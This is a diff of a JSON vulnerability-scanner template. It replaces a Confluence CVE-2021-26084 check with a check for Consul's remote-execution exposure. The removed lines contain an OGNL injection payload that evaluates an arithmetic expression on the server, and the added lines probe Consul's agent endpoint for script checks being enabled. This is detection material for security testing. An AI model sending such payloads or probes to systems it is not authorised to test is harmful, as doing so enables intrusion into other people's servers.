@@ -1,15 +1,15 @@
 {
-    "Name": "CVE-2021-26084Confluence远程代码执行漏洞",
-    "Description": "Confluence",
-    "Product": "Confluence",
+    "Name": "consul-rexec-rce-2",
+    "Description": "Consul rexec remote command execution",
+    "Product": "consul",
     "author": "chumeng",
     "Request":[
         {
-        "Method": "POST",
+        "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/pages/doenterpagevariables.action",
+        "Uri":"/v1/agent/self",
         "Port":"",
-        "Data":"queryString=aaaa\\u0027%2b#{3*333}%2b\\u0027bbb",
+        "Data":"",
         "Follow_redirects":"false",
         "Upload":{"Name": "","fileName": "","filePath": "" },
         "Response":{
@@ -18,8 +18,12 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "aaaa{999"
-                },
+                "Value": "json"
+                },{
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "\"EnableScriptChecks\": true"
+                    },
                  {
                 "Operation": "code", 
                 "Key":"",
